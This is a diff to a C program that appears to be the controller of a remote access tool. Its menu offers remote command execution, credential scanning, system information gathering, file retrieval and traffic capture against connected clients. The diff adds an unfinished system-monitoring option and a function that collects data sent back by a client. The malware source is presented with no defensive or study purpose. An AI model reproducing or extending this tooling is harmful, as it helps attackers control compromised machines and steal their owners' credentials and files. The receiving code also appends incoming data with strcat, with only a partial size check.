@@ -11,7 +11,9 @@
 
 #define PORT 8080
 
-char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n";
+char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system --- IN LUCRU\n ";
+
+
 
 void exec_on_client(int clientfd)
 {   
@@ -45,39 +47,76 @@ void get_credentials(int clientfd)
 
 void get_system_info(int clientfd)
 {
-                char sys_info[MAXLINE * 10] = "";
-                char buffer[MAXLINE]; 
-                int total_bytes_read = 0;
-                int bytes_read; 
+    char sys_info[MAXLINE * 10] = "";
+    char buffer[MAXLINE]; 
+    int total_bytes_read = 0;
+    int bytes_read; 
 
-                sys_info[0]=0;
+    sys_info[0]=0;
 
-                while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
-                {
-                    buffer[bytes_read] = '\0'; 
-                    char *end_marker = strstr(buffer, "<END_OF_DATA>");
-                    if (end_marker != NULL) 
-                    {
-                        *end_marker = '\0';
-                        strcat(sys_info, buffer);
-                        myWrite("Sistem Information from client: \n",STDOUT_FILENO);
-                        myWrite(sys_info,STDOUT_FILENO);
-                        break; 
-                    }   
-                    strcat(sys_info, buffer);
-                    total_bytes_read += bytes_read;
-                    if (total_bytes_read >= sizeof(sys_info) - 1) 
-                    {
-                        myWrite("Buffer limit reached, cannot read further data.\n",STDOUT_FILENO);
-                        break;
-                    }
-                 }
+    while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
+    {
+        buffer[bytes_read] = '\0'; 
+        char *end_marker = strstr(buffer, "<END_OF_DATA>");
+        if (end_marker != NULL) 
+        {
+            *end_marker = '\0';
+            strcat(sys_info, buffer);
+            myWrite("Sistem Information from client: \n",STDOUT_FILENO);
+            myWrite(sys_info,STDOUT_FILENO);
+            break; 
+        }   
+        strcat(sys_info, buffer);
+        total_bytes_read += bytes_read;
+        if (total_bytes_read >= sizeof(sys_info) - 1) 
+        {
+            myWrite("Buffer limit reached, cannot read further data.\n",STDOUT_FILENO);
+            break;
+        }
+        }
 
-                if (total_bytes_read == 0) 
-                {
-                    myWrite("Failed to receive system information from client or connection closed.\n",STDOUT_FILENO);
-                }
+    if (total_bytes_read == 0) 
+    {
+        myWrite("Failed to receive system information from client or connection closed.\n",STDOUT_FILENO);
+    }
 }
+
+void get_system_monitor(int clientfd)
+{
+    char monitor_data[MAXLINE * 10] = "";
+    char buffer[MAXLINE]; 
+    int total_bytes_read = 0;
+    int bytes_read; 
+
+    monitor_data[0] = '\0'; 
+
+    while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
+    {
+        buffer[bytes_read] = '\0'; 
+        char *end_marker = strstr(buffer, "<END_OF_DATA>");
+        if (end_marker != NULL) 
+        {
+            *end_marker = '\0';
+            strcat(monitor_data, buffer);
+            myWrite("System Monitoring Data from client: \n", STDOUT_FILENO);
+            myWrite(monitor_data, STDOUT_FILENO);
+            break; 
+        }   
+        strcat(monitor_data, buffer);
+        total_bytes_read += bytes_read;
+        if (total_bytes_read >= sizeof(monitor_data) - 1) 
+        {
+            myWrite("Buffer limit reached, cannot read further data.\n", STDOUT_FILENO);
+            break;
+        }
+    }
+
+    if (total_bytes_read == 0) 
+    {
+        myWrite("Failed to receive system monitoring data from client or connection closed.\n", STDOUT_FILENO);
+    }
+}
+
 
 void flushSTDIN()
 {
@@ -243,7 +282,11 @@ int main()
             case '5':
             write(connfd,"5",1);
             capturetraffic(connfd);
-            break;
+            //IN LUCRU
+            //case '6':
+            //write(connfd, "6", 1);
+            //get_system_monitor(connfd);
+            //break;
             default:
             break;
 
